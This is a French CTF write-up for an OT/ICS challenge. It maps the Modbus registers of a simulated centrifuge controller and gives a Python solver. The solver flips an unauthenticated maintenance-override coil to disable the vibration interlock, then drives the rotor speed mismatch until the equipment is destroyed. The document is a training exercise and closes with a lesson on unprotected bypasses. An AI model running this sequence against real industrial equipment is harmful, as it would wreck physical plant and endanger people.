# OT#007 — Centrifuge Resonance (Modbus TCP réel)

- **Auteur :** lyons

- **Cible :** `<HOST>:<PORT>` — énoncé hébergé à cette adresse : https://otctf.pages.dev/ot-007-centrifuge-resonance/light
- **Catégorie :** OT / ICS
- **Flag :** `CTF{REDACTED}`
- **Protocole :** du Modbus TCP authentique (aucune variante maison, à la différence des autres OT)

## Mise en situation

On prend la main sur un contrôleur de cascade de centrifugeuses bi-rotor. En principe, un interlock de vibration impose un arrêt contrôlé avant que la vibration n'atteigne un niveau destructeur — à la différence des autres challenges OT de la série, **la protection fonctionne réellement** ici ; l'enjeu consiste à la circonvenir, non à tirer parti d'un garde-fou simplement absent.

## Cartographie Modbus relevée

| Adresse | Type | Rôle |
|---|---|---|
| Coil 0 | coil | POWER / run enable |
| Coil 1 | coil | **MAINTENANCE OVERRIDE** — met hors service l'interlock de vibration |
| HR10 | holding register | Setpoint vitesse rotor A (lourd/lent) |
| HR11 | holding register | Setpoint vitesse rotor B (léger/rapide) |
| IR0 | input register | Status bitfield : bit1 = interlock déclenché, bit2 = DESTROYED |
| IR2 | input register | Setpoint A courant (lecture) |
| IR3 | input register | Setpoint B courant (lecture) |
| IR4 | input register | Niveau de vibration |
| IR5+ | input registers | Flag ASCII (1 caractère par registre) dès que DESTROYED est atteint |

## La brèche

Le coil 1 (**maintenance override**) s'actionne librement, sans la moindre restriction ni authentification, et met entièrement hors service l'interlock de vibration censé protéger l'équipement. Une fois ce coil levé, plus rien n'interdit de pousser le système jusqu'à la casse.

## Déroulé

1. **POWER ON** — `coil 0 = True`.
2. **MAINTENANCE OVERRIDE ON** — `coil 1 = True` → l'arrêt protecteur échappe définitivement à l'interlock.
3. Creuser un **mismatch de vitesse** de plus en plus large entre les rotors : HR10 laissé bas et fixe (1500), HR11 monté par paliers (1500 → 3000 → 4000 → 4500 → 6000 → 9000...). La vibration (IR4) épouse l'écart de vitesse entre les deux rotors.
4. L'interlock étant dans l'incapacité d'arrêter le process, la vibration franchit le seuil destructeur → le bit2 (DESTROYED) de IR0 se lève → le flag s'écrit en ASCII dans les input registers d'après ; trier les octets imprimables et traquer `CTF{...}`.

L'intégralité de la séquence tient dans **une seule connexion TCP** persistante : rien ne garantit que l'état (coils, setpoints, vibration accumulée) survit à une reconnexion, et l'enchaînement doit se dérouler sans coupure pour atteindre la destruction avant qu'un mécanisme externe ne remette le process à zéro.

## Script (solveur)

Client Modbus TCP minimaliste écrit à la main (aucune dépendance `pymodbus`), qui implémente les function codes `0x01` (read coils), `0x03` (read holding registers), `0x04` (read input registers), `0x05` (write single coil) et `0x06` (write single register) au-dessus du MBAP header standard.

```python
import time
from mb import MB

def main():
    m = MB(gap=0.03).connect()
    if m.hr(0, 2)[0] == 'dead':
        print("server throttled/down - wait ~5 min of silence and retry"); return
    for i in range(90): m.write_reg(i, 0)          # clean slate
    m.write_coil(0, True)                          # POWER / run enable
    m.write_coil(1, True)                          # MAINTENANCE OVERRIDE -> interlock disabled
    m.write_reg(10, 1500)                          # Rotor A (heavy/slow) setpoint - keep low
    m.write_reg(11, 1500)                          # Rotor B (light/fast) setpoint
    time.sleep(1.5)
    for sp in [3000, 4000, 4500, 6000, 9000, 12000]:
        m.write_reg(11, sp)                        # widen the mismatch -> vibration rises
        for _ in range(2):
            time.sleep(0.8)
            ir = m.ir(0, 90)[1]
            if ir is None: break
            status, vib = ir[0], ir[4]
            if status & 4:                         # bit2 = DESTROYED
                chars = ''.join(chr(v) for v in ir if 32 <= v < 127)
                i = chars.find('CTF{')
                print("FLAG:", chars[i:chars.find('}', i)+1])
                m.close(); return
            if status & 2:                         # bit1 = interlock tripped (shouldn't happen w/ override)
                print("interlock tripped - override not engaged"); m.close(); return
    m.close()

if __name__ == '__main__':
    main()
```

## Issue

La casse est survenue dès le palier `HR11=9000` (vibration ≈ 300, bit2 de IR0 levé). Le flag a été extrait en relisant les input registers après destruction : `CTF{REDACTED}` — la soumission revient à l'utilisateur.

## Chausse-trapes

- Un `FC06` (write single register) renvoie son ACK même pour une adresse qu'il ne mémorise pas réellement — selon l'implémentation, seul `FC16` (write multiple) pose certains setpoints de façon fiable ; contrôler toujours par relecture, ne jamais se fier à l'ACK.
- Dès que la séquence POWER → OVERRIDE → mismatch échappe à la même connexion, l'état repart à zéro — de quoi s'imaginer à tort que l'override est inopérant.
- Un sweep d'unit-id trop mordant ou des reconnexions à répétition attirent un rate-limit côté serveur ; espacer les tentatives et réutiliser une connexion unique permet d'éviter le ban.

## Transposition au réel

À l'inverse des autres OT de la série (protection simplement absente), l'interlock fait ici correctement son travail — la vraie brèche, c'est l'existence d'un **bypass de maintenance non protégé**, grand classique des interlocks industriels (portes d'accès, clés de maintenance, overrides) : la protection logicielle/process tient la route, mais un mécanisme d'exception conçu pour la maintenance humaine se mue en porte dérobée dès qu'il échappe à l'authentification comme à l'audit. Sur un site réel, ces mêmes écritures détruiraient du matériel bien concret — ne reproduire que dans le cadre d'un CTF explicitement autorisé.

---

*Rédaction : **lyons** — BUG|PWN CTF · OT#007 Centrifuge Resonance.*
